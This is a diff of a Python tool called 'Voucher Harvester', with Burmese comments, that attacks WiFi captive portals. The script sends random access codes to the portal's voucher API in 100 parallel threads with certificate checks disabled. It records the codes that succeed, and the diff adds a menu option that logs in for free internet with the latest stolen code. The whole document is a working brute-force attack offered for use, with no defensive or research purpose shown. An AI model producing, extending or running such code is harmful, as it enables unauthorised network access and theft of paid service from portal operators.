@@ -16,7 +16,6 @@ urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)
 # --- CONFIGURATION ---
 TRIED_CODES_FILE = "tried_codes.txt"
 SUCCESS_CODES_FILE = "success.txt"
-CODE_TO_TEST = "536884" 
 VOUCHER_THREADS = 100 
 
 # --- CLEAR SCREEN FUNCTION ---
@@ -44,8 +43,8 @@ def show_menu():
     print("========================================")
     print("         🛠️  VOUCHER HARVESTER          ")
     print("========================================")
-    print("1. 🔍 Fast Random Voucher Harvesting")
-    print(f"2. 🔍 Test Specific Code: {CODE_TO_TEST}")
+    print("1. 🌐 Internet Access (Use Success Code)")
+    print("2. 🔍 Fast Random Voucher Harvesting")
     print("3. 📋 View Success Codes")
     print("========================================\n")
     choice = input("👉 ရွေးချယ်ပါ (1-3): ")
@@ -73,11 +72,15 @@ def test_code(code, portal_host, sid, session):
         # --- API CALL စမ်းသပ်သည့်နေရာ ---
         v_res = session.post(voucher_api, json={'accessCode': code, 'sessionId': sid, 'apiVersion': 1}, timeout=3)
         
-        if v_res.status_code == 200 and "success" in v_res.text.lower():
-            # SUCCESS အစိမ်းရောင်တန်းကျလာမည်
-            print(f"\n\033[92m✅ SUCCESS! Found Code: {code}\033[0m")
-            save_success_code(code)
-            return True
+        # --- RESPONSE စစ်ဆေးခြင်း ---
+        if v_res.status_code == 200:
+            if "success" in v_res.text.lower():
+                print(f"\n\033[92m✅ SUCCESS! Valid Code Found: {code}\033[0m")
+                save_success_code(code)
+                return True
+            else:
+                # print(f"❌ FAIL: {code} - {v_res.text}") # debug
+                pass
     except:
         pass
     
@@ -97,9 +100,12 @@ def start_voucher_harvesting():
 
     # SID ယူခြင်း
     session = requests.Session()
-    r2 = session.get(portal_url, verify=False, timeout=10)
-    sid_match = re.search(r'sessionId=([a-zA-Z0-9]+)', r2.text)
-    sid = sid_match.group(1) if sid_match else "unknown"
+    try:
+        r2 = session.get(portal_url, verify=False, timeout=10)
+        sid_match = re.search(r'sessionId=([a-zA-Z0-9]+)', r2.text)
+        sid = sid_match.group(1) if sid_match else "unknown"
+    except:
+        sid = "unknown"
 
     threads = []
     
@@ -125,31 +131,48 @@ def start_voucher_harvesting():
             
         print(f"\r🔍 Random စမ်းသပ်နေသည်: {code}", end="", flush=True)
 
-# --- SPECIFIC CODE TESTER ---
-def test_specific_code():
-    print(f"\n🔍 စမ်းသပ်နေသည်: {CODE_TO_TEST} ...")
+# --- INTERNET ACCESS LOGIC ---
+def use_internet_access():
+    print("\n🌐 Internet Access အတွက် Code စစ်ဆေးနေသည်...")
+    
+    if not os.path.exists(SUCCESS_CODES_FILE):
+        print("❌ Success Codes များမရှိပါ။")
+        time.sleep(2)
+        return
+
+    with open(SUCCESS_CODES_FILE, "r") as f:
+        codes = f.readlines()
+        if not codes:
+            print("❌ Success Codes များမရှိပါ။")
+            time.sleep(2)
+            return
+        code = codes[-1].strip() # နောက်ဆုံးရတဲ့ code ကိုသုံးမယ်
+
+    print(f"📡 သုံးစွဲမည့် Code: {code}")
     
     portal_host, portal_url = get_portal_info()
     if not portal_host:
-        print("❌ Captive Portal ကို ရှာမတွေ့ပါ။ WiFi သေချာချိတ်ပါ။")
+        print("❌ Captive Portal ကို ရှာမတွေ့ပါ။")
         return
 
     # SID ယူခြင်း
     session = requests.Session()
-    r2 = session.get(portal_url, verify=False, timeout=10)
-    sid_match = re.search(r'sessionId=([a-zA-Z0-9]+)', r2.text)
-    sid = sid_match.group(1) if sid_match else "unknown"
+    try:
+        r2 = session.get(portal_url, verify=False, timeout=10)
+        sid_match = re.search(r'sessionId=([a-zA-Z0-9]+)', r2.text)
+        sid = sid_match.group(1) if sid_match else "unknown"
+    except:
+        sid = "unknown"
     
     voucher_api = f"{portal_host}/api/auth/voucher/"
     
     try:
-        v_res = session.post(voucher_api, json={'accessCode': CODE_TO_TEST, 'sessionId': sid, 'apiVersion': 1}, timeout=5)
+        v_res = session.post(voucher_api, json={'accessCode': code, 'sessionId': sid, 'apiVersion': 1}, timeout=5)
         
         if v_res.status_code == 200 and "success" in v_res.text.lower():
-            print(f"\n\033[92m✅ SUCCESS! Valid Code Found: {CODE_TO_TEST}\033[0m")
-            save_success_code(CODE_TO_TEST)
+            print(f"\n\033[92m✅ SUCCESS! Internet Access Connected with Code: {code}\033[0m")
         else:
-            print(f"\n❌ FAIL! Invalid Code: {CODE_TO_TEST}")
+            print(f"\n❌ FAIL! Cannot connect with code: {code}")
             
     except Exception as e:
         print(f"\n❌ Error: {e}")
@@ -160,9 +183,9 @@ def test_specific_code():
 if __name__ == "__main__":
     choice = show_menu()
     if choice == '1':
-        start_voucher_harvesting()
+        use_internet_access()
     elif choice == '2':
-        test_specific_code()
+        start_voucher_harvesting()
     elif choice == '3':
         print("\n📋 Success Code များ:")
         if os.path.exists(SUCCESS_CODES_FILE):
